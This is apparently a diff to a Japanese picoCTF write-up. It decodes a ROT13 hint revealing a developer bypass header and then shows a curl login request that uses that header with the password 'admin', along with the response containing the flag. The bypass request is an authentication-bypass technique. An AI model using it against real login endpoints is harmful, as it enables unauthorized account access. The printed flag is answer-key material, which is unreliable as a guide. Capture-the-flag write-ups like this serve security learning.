@@ -57,9 +57,10 @@ strings disko-1.dd | grep -i "picoctf"
 2. 文字列の復号
     1. シーザー暗号: https://dencode.com/ja/cipher
     2. ROT13 https://dencode.com/ja/cipher/rot13
+- ROT13で復号
+`# <!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" -->`
 3. ヘッダーの追加
 ```bash
-# <!-- NOTE: Jack - temporary bypass: use header "X-Dev-Access: yes" -->
 curl -X POST -H "X-Dev-Access: yes" -d 'email=ctf-player@picoctf.org&password=admin' http://amiable-citadel.picoctf.net:61058/login
 # {"success":true,"email":"ctf-player@picoctf.org","firstName":"pico","lastName":"player","flag":"picoCTF{brut4_f0rc4_125f752d}"}
 ```
